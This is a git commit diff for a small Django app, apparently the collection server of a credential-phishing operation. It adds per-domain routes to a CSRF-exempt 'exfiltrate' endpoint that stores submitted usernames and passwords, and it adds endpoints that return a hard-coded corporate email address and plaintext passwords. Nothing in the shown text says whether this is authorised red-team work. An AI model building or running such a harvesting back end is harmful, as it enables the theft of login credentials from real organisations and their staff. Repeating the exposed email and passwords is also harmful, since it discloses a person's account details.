eb0f9ae1eb569a65526117d6b3405b0a9f92b69b
emmanuel.lacourarie-ext <emmanuel.lacourarie-ext@mousquetaires.com>
2020-02-18 15:18:33 +0100

    Add usernames and passwords views+model

--- app/urls.py
+++ app/urls.py
@@ -3,6 +3,8 @@ from django.urls import path
 from . import views
 
 urlpatterns = [
-    path('', views.index, name='index'),
-    path('exfiltrate/', views.exfiltrate, name='exfiltrate'),
+    path('<domain>/', views.index, name='index'),
+    path('<domain>/exfiltrate/', views.exfiltrate, name='exfiltrate'),
+    path('<domain>/usernames/', views.usernames, name='usernames'),
+    path('<domain>/passwords/', views.passwords, name='passwords'),
 ]
--- app/views.py
+++ app/views.py
@@ -4,17 +4,30 @@ from django.http import HttpResponse
 from django.template import loader
 from django.views.decorators.csrf import csrf_exempt
 
-from app.models import Credential
+from app.models import Credential, Domain
 
 
-def index(request):
+def index(request, domain):
+    find = Domain.objects.get(name=domain)
     template = loader.get_template('app/index.html')
-    return HttpResponse(template.render({}, request))
+    context = {
+        'domain': find
+    }
+    return HttpResponse(template.render(context, request))
 
 
 @csrf_exempt
-def exfiltrate(request):
+def exfiltrate(request, domain):
+    find = Domain.objects.get(name=domain)
     cred_json = json.loads(request.body)
-    cred = Credential(username=cred_json['username'], password=cred_json['password'])
+    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
     cred.save()
     return HttpResponse(status=204)
+
+
+def usernames(request, domain):
+    return HttpResponse('emmanuel.lacourarie-ext@mousquetaires.com\n')
+
+
+def passwords(request, domain):
+    return HttpResponse('test\nMousquetaires1\ncoucou\n')
